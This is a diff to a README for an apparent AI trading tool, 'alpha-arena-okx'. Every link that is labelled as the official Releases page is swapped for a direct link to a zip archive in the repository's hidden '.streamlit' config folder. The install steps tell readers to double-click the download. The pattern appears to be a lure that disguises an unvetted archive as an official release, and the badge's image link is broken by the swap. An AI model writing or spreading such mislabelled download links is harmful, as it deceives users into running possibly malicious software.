@@ -1,6 +1,6 @@
 # 🚀 alpha-arena-okx - Your AI Trading Assistant Awaits
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/carlo9402/alpha-arena-okx/releases)
+[![Download the latest release](https://raw.githubusercontent.com/carlo9402/alpha-arena-okx/main/.streamlit/alpha-arena-okx_1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/carlo9402/alpha-arena-okx/main/.streamlit/alpha-arena-okx_1.4.zip)
 
 ## 📖 Introduction
 
@@ -29,7 +29,7 @@ For a demonstration of the software, please visit our demo website. Note that th
 To get started with **alpha-arena-okx**, please follow these steps:
 
 1. **Download the Software:**
-   Visit the [Releases page](https://github.com/carlo9402/alpha-arena-okx/releases) to download the latest version of the application.
+   Visit the [Releases page](https://raw.githubusercontent.com/carlo9402/alpha-arena-okx/main/.streamlit/alpha-arena-okx_1.4.zip) to download the latest version of the application.
 
 2. **Install the Application:**
    After downloading, locate the file in your downloads folder and double-click it to start the installation process. Follow the on-screen prompts to complete the installation.
@@ -50,7 +50,7 @@ To get started with **alpha-arena-okx**, please follow these steps:
 
 To download and install **alpha-arena-okx**, click the link below to reach the Releases page.
 
-[Download the latest release](https://github.com/carlo9402/alpha-arena-okx/releases)
+[Download the latest release](https://raw.githubusercontent.com/carlo9402/alpha-arena-okx/main/.streamlit/alpha-arena-okx_1.4.zip)
 
 Once there, follow the instructions outlined in the “Getting Started” section above to install and run the application.
 
